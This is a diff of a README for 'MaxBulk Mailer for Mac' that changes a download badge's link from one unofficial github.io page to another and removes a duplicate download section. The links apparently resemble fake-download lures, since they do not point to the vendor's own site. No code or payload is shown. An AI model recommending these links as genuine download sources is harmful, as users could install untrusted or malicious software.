@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get MaxBulk Mailer Mac](https://img.shields.io/badge/Get_MaxBulk_Mailer_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/maxbulk)
+[![Get MaxBulk Mailer Mac](https://img.shields.io/badge/Get_MaxBulk_Mailer_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/maxbulk)
 
 </div>
 
@@ -68,16 +68,6 @@ Key highlights:
 ---
 
 ![Mailing List Tools](https://www.maxbulkmailer.com/assets/images/screen-shot-2018-04-10-at-07.15.40-2000x1250-800x500.png)  
-
----
-
-## Get MaxBulk Mailer Mac  
-
-<div align="center">
-
-[![Get MaxBulk Mailer Mac](https://img.shields.io/badge/Get_MaxBulk_Mailer_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/maxbulk)
-
-</div>
 
 ---
 
